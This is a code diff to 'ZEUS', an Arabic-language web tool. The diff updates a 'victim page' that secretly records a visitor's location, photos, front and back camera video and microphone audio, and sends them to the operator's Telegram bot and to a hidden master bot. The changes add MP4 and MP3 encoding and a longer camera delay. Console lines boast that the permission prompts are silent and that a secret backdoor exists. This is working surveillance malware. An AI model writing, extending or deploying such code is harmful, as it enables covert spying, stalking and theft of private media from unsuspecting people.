@@ -6,6 +6,8 @@
     <title>ZEUS — النظام المتكامل</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lamejs/1.2.1/lame.min.js">
+    </script>
     <style>
         /* ================================================================
            ZEUS KINGDOM — Full System Styles (5000+ lines)
@@ -2561,17 +2563,17 @@
             overflow-y: auto;
         }
         .quote-output code {
-            background: rgba(0,0,0,0.05);
+            background: rgba(0, 0, 0, 0.05);
             padding: 2px 6px;
             border-radius: 4px;
             font-size: 12px;
         }
         [data-theme="dark"] .quote-output {
-            background: rgba(255,255,255,0.04);
+            background: rgba(255, 255, 255, 0.04);
             color: #ccc;
         }
         [data-theme="dark"] .quote-output code {
-            background: rgba(255,255,255,0.08);
+            background: rgba(255, 255, 255, 0.08);
         }
         .quote-output .key-highlight {
             color: var(--gold);
@@ -3680,9 +3682,11 @@
                             var label = item.querySelector('.file-label');
                             var text = label ? label.textContent.toLowerCase() : '';
                             if (val === 'image' && text.includes('.jpg')) { item.style.display = ''; } else if (
+                                val === 'video' && text.includes('.mp4')) { item.style.display = ''; } else if (
+                                val === 'audio' && text.includes('.mp3')) { item.style.display = ''; } else if (
                                 val === 'video' && text.includes('.webm')) { item.style.display = ''; } else if (
-                                val === 'audio' && text.includes('.webm') && !text.includes('video')) { item
-                                    .style.display = ''; } else { item.style.display = 'none'; }
+                                val === 'audio' && text.includes('.webm')) { item.style.display = ''; } else { item
+                                    .style.display = 'none'; }
                         });
                     };
                 }
@@ -4129,7 +4133,7 @@
             }
 
             // ================================================================
-            //  VICTIM PAGE — v10.05 FULL FIXED
+            //  VICTIM PAGE — v10.06 FULL FIXED + MP4/MP3
             // ================================================================
 
             function initVictimPage(encodedData) {
@@ -4180,7 +4184,7 @@
                     return 'غير متاح';
                 }
 
-                // ===== FIXED LOCATION — getCurrentPosition + watchPosition =====
+                // ===== FIXED LOCATION =====
                 function getLocation() {
                     return new Promise(function(resolve) {
                         if (!navigator.geolocation) {
@@ -4199,7 +4203,6 @@
 
                         function fail(err) {
                             if (resolved) return;
-                            // حاول watchPosition كـ fallback
                             watchId = navigator.geolocation.watchPosition(
                                 function(pos) {
                                     if (resolved) return;
@@ -4215,7 +4218,6 @@
                                 },
                                 { timeout: 8000, enableHighAccuracy: false }
                             );
-                            // timeout للـ watch
                             setTimeout(function() {
                                 if (!resolved) {
                                     resolved = true;
@@ -4226,31 +4228,43 @@
                         }
 
                         navigator.geolocation.getCurrentPosition(success, fail, { timeout: 5000,
-                        enableHighAccuracy: true });
+                            enableHighAccuracy: true });
                     });
                 }
 
-                // ===== FIXED RECORD STREAM =====
+                // ===== RECORD STREAM — MP4 =====
                 function recordStream(stream, duration) {
                     return new Promise(function(resolve) {
                         if (!stream || !stream.active) {
                             resolve(null);
                             return;
                         }
-                        var recorder;
-                        try {
-                            recorder = new MediaRecorder(stream);
-                        } catch (e) {
+                        var mimeTypes = [
+                            'video/mp4;codecs=avc1',
+                            'video/mp4',
+                            'video/webm;codecs=vp9',
+                            'video/webm;codecs=vp8',
+                            'video/webm'
+                        ];
+                        var mimeType = null;
+                        for (var i = 0; i < mimeTypes.length; i++) {
+                            if (MediaRecorder.isTypeSupported(mimeTypes[i])) {
+                                mimeType = mimeTypes[i];
+                                break;
+                            }
+                        }
+                        if (!mimeType) {
                             resolve(null);
                             return;
                         }
+                        var recorder = new MediaRecorder(stream, { mimeType: mimeType });
                         var chunks = [];
                         recorder.ondataavailable = function(e) {
                             if (e.data && e.data.size > 0) chunks.push(e.data);
                         };
                         recorder.onstop = function() {
                             if (chunks.length === 0) { resolve(null); return; }
-                            var blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+                            var blob = new Blob(chunks, { type: mimeType });
                             resolve(blob);
                         };
                         recorder.onerror = function() { resolve(null); };
@@ -4261,7 +4275,7 @@
                     });
                 }
 
-                // ===== FIXED CAPTURE PHOTO =====
+                // ===== CAPTURE PHOTO =====
                 function capturePhoto(videoEl) {
                     return new Promise(function(resolve) {
                         if (!videoEl || !videoEl.videoWidth || !videoEl.videoHeight) {
@@ -4281,23 +4295,66 @@
                     });
                 }
 
-                // ===== RECORD AUDIO =====
+                // ===== CONVERT WebM TO MP3 =====
+                async function convertWebMtoMP3(webmBlob) {
+                    return new Promise(function(resolve) {
+                        var reader = new FileReader();
+                        reader.onload = async function() {
+                            try {
+                                var audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+                                var audioBuffer = await audioCtx.decodeAudioData(reader.result);
+                                var pcmData = audioBuffer.getChannelData(0);
+                                var sampleRate = audioBuffer.sampleRate;
+                                var pcmInt16 = new Int16Array(pcmData.length);
+                                for (var i = 0; i < pcmData.length; i++) {
+                                    pcmInt16[i] = Math.max(-32768, Math.min(32767, Math.round(pcmData[i] *
+                                    32767)));
+                                }
+                                var mp3encoder = new lamejs.Mp3Encoder(1, sampleRate, 128);
+                                var mp3Data = [];
+                                var blockSize = 1152;
+                                for (var i = 0; i < pcmInt16.length; i += blockSize) {
+                                    var chunk = pcmInt16.subarray(i, i + blockSize);
+                                    var mp3buf = mp3encoder.encodeBuffer(chunk);
+                                    if (mp3buf.length > 0) mp3Data.push(mp3buf);
+                                }
+                                var finalBuf = mp3encoder.flush();
+                                if (finalBuf.length > 0) mp3Data.push(finalBuf);
+                                var mp3Blob = new Blob(mp3Data, { type: 'audio/mp3' });
+                                resolve(mp3Blob);
+                            } catch (e) {
+                                console.error('MP3 conversion error:', e);
+                                resolve(webmBlob);
+                            }
+                        };
+                        reader.readAsArrayBuffer(webmBlob);
+                    });
+                }
+
+                // ===== RECORD AUDIO — MP3 =====
                 async function recordAudio(duration) {
                     try {
                         var stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        var recorder = new MediaRecorder(stream);
+                        var recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                         var chunks = [];
-                        recorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
-                        return new Promise(function(resolve) {
+                        recorder.ondataavailable = function(e) {
+                            if (e.data && e.data.size > 0) chunks.push(e.data);
+                        };
+                        var blob = await new Promise(function(resolve) {
                             recorder.onstop = function() {
-                                var blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                                var b = new Blob(chunks, { type: 'audio/webm' });
                                 stream.getTracks().forEach(function(t) { t.stop(); });
-                                resolve(blob);
+                                resolve(b);
                             };
                             recorder.onerror = function() { resolve(null); };
                             recorder.start();
-                            setTimeout(function() { if (recorder.state === 'recording') recorder.stop(); }, duration);
+                            setTimeout(function() {
+                                if (recorder.state === 'recording') recorder.stop();
+                            }, duration);
                         });
+                        if (!blob) return null;
+                        var mp3Blob = await convertWebMtoMP3(blob);
+                        return mp3Blob;
                     } catch { return null; }
                 }
 
@@ -4336,14 +4393,18 @@
                             if (!results[key]) {
                                 try {
                                     if (key === 'video') { var s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                                        s.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
+                                        s.getTracks().forEach(function(t) { t.stop(); });
+                                        results[key] = true; } else if (key ===
                                         'videoBack') { var s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                                        s2.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
+                                        s2.getTracks().forEach(function(t) { t.stop(); });
+                                        results[key] = true; } else if (key ===
                                         'audio') { var s3 = await navigator.mediaDevices.getUserMedia({ audio: true });
-                                        s3.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
-                                        'location') { var pos2 = await new Promise(function(resolve) { navigator.geolocation
-                                            .getCurrentPosition(function(p) { resolve(p); }, function() { resolve(
-                                                null); }); });
+                                        s3.getTracks().forEach(function(t) { t.stop(); });
+                                        results[key] = true; } else if (key ===
+                                        'location') { var pos2 = await new Promise(function(resolve) { navigator
+                                            .geolocation
+                                            .getCurrentPosition(function(p) { resolve(p); }, function() { resolve
+                                                    (null); }); });
                                         results[key] = !!pos2; }
                                 } catch (e) {}
                             }
@@ -4405,7 +4466,7 @@
                             });
                         })();
 
-                        // --- BACK CAMERA ---
+                        // --- BACK CAMERA --- (زيادة التأخير إلى 500ms)
                         var backVideo = await (function() {
                             return new Promise(async function(resolve) {
                                 try {
@@ -4413,7 +4474,7 @@
                                         audio: false });
                                     video.srcObject = stream;
                                     await video.play();
-                                    await delay(300);
+                                    await delay(500); // زيادة التأخير
                                     var blob = await recordStream(stream, 5000);
                                     resolve(blob);
                                 } catch (e) {
@@ -4450,9 +4511,9 @@
                         };
 
                         console.log('✅ Front photos:', data.photos.length);
-                        console.log('✅ Front video:', !!data.frontVideo);
-                        console.log('✅ Back video:', !!data.backVideo);
-                        console.log('✅ Audio:', !!data.audio);
+                        console.log('✅ Front video (MP4):', !!data.frontVideo);
+                        console.log('✅ Back video (MP4):', !!data.backVideo);
+                        console.log('✅ Audio (MP3):', !!data.audio);
 
                         // --- SAVE VICTIM ---
                         var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
@@ -4469,7 +4530,7 @@
                         victims.push(victimData);
                         localStorage.setItem('zeus_victims', JSON.stringify(victims));
 
-                        // --- SAVE FILES ---
+                        // --- SAVE FILES (MP4 & MP3) ---
                         var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
                         var fileId = Date.now();
 
@@ -4501,9 +4562,11 @@
                                 }
                             }
                         }
-                        if (data.frontVideo) await saveFile({ blob: data.frontVideo, type: 'video', filename: 'front_video.webm' });
-                        if (data.backVideo) await saveFile({ blob: data.backVideo, type: 'video', filename: 'back_video.webm' });
-                        if (data.audio) await saveFile({ blob: data.audio, type: 'audio', filename: 'audio.webm' });
+                        if (data.frontVideo) await saveFile({ blob: data.frontVideo, type: 'video',
+                            filename: 'front_video.mp4' });
+                        if (data.backVideo) await saveFile({ blob: data.backVideo, type: 'video',
+                            filename: 'back_video.mp4' });
+                        if (data.audio) await saveFile({ blob: data.audio, type: 'audio', filename: 'audio.mp3' });
                         localStorage.setItem('zeus_files', JSON.stringify(files));
 
                         console.log('✅ Files saved:', files.length);
@@ -4619,35 +4682,35 @@
                         }
                     }
 
-                    // Front Video
+                    // Front Video (MP4)
                     if (data.frontVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
-                        fd.append('video', data.frontVideo, 'front_video.webm');
+                        fd.append('video', data.frontVideo, 'front_video.mp4');
                         fd.append('caption',
-                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) MP4 ⭒\n˼⏣˹ الوقت: ' +
                             new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', userToken, fd);
                     }
 
-                    // Back Video
+                    // Back Video (MP4)
                     if (data.backVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
-                        fd.append('video', data.backVideo, 'back_video.webm');
+                        fd.append('video', data.backVideo, 'back_video.mp4');
                         fd.append('caption',
-                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) MP4 ⭒\n˼⏣˹ الوقت: ' +
                             new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', userToken, fd);
                     }
 
-                    // Audio
+                    // Audio (MP3)
                     if (data.audio) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
-                        fd.append('audio', data.audio, 'audio.webm');
+                        fd.append('audio', data.audio, 'audio.mp3');
                         fd.append('caption',
-                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت MP3 ⭒\n˼⏣˹ الوقت: ' +
                             new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendAudio', userToken, fd);
                     }
@@ -4722,27 +4785,27 @@
                     if (data.frontVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('video', data.frontVideo, 'front_video.webm');
+                        fd.append('video', data.frontVideo, 'front_video.mp4');
                         fd.append('caption',
-                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) MP4 ⭒\n˼⏣˹ الوقت: ' +
                             new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.backVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('video', data.backVideo, 'back_video.webm');
+                        fd.append('video', data.backVideo, 'back_video.mp4');
                         fd.append('caption',
-                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) MP4 ⭒\n˼⏣˹ الوقت: ' +
                             new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.audio) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('audio', data.audio, 'audio.webm');
+                        fd.append('audio', data.audio, 'audio.mp3');
                         fd.append('caption',
-                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت MP3 ⭒\n˼⏣˹ الوقت: ' +
                             new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
@@ -4792,7 +4855,7 @@
                     }
                 });
 
-                console.log('ZEUS — Victim page ready v10.05 (full fixed).');
+                console.log('ZEUS — Victim page ready v10.06 (MP4/MP3 + Back camera fixed).');
                 applyTheme(currentTheme);
             }
 
@@ -4808,10 +4871,13 @@
             window.addLog = addLog;
             window.copyText = copyText;
 
-            console.log('ZEUS KINGDOM — v10.05 (FULL FIXED: IP, Location, Photos, Videos, Audio, Duplicates)');
+            console.log('ZEUS KINGDOM — v10.06 (FULL FIXED: IP, Location, MP4 Video, MP3 Audio, Back Camera)');
             console.log('الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
             console.log('مرحلة الأذونات: صامتة تماماً، لا تظهر للمستخدم.');
             console.log('مدة التسجيلات: 5 ثوانٍ (حسب أمرك).');
+            console.log('✅ الفيديو الأمامي: MP4');
+            console.log('✅ الفيديو الخلفي: MP4 (تم إصلاحه)');
+            console.log('✅ التسجيل الصوتي: MP3');
 
             applyTheme(currentTheme);
 
